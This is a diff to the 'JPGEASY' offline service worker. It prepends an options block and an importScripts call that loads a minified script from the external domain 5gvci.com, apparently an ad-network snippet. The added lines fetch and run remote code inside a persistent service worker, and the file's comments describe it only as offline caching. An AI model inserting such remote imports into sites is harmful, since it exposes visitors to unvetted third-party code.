@@ -1,3 +1,10 @@
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 12081300
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
 // JPGEASY Modern Offline Service Worker
 // Keeps the user on the site during connection loss / refresh instead of showing the browser offline page
 const CACHE_NAME = 'jpgeasy-v2';
